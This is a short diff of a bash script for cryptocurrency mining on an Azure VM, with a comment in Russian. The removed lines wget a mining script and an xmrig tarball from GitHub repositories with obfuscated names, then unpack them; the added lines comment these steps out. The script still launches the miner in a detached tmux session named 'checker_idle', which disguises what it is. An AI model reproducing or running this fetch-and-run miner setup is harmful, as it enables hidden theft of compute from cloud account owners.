@@ -1,11 +1,12 @@
 #!/bin/bash
-cd /home/azureuser
-wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser
-chmod +x mine_vm.sh
+#### ПОД КУБИР И ХМР СВИТЧ СДЕЛАЛ
+#cd /home/azureuser
+#wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser
+#chmod +x mine_vm.sh
 tmux new -ds checker_idle /home/azureuser/mine_vm.sh 
-wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
-tar -xf mo_xmrig.tar.gz
-rm -r mo_xmrig.tar.gz
+#wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
+#tar -xf mo_xmrig.tar.gz
+#rm -r mo_xmrig.tar.gz
 ########################
 #mkdir /home/azureuser/qub_dir
 #cd /home/azureuser/qub_dir
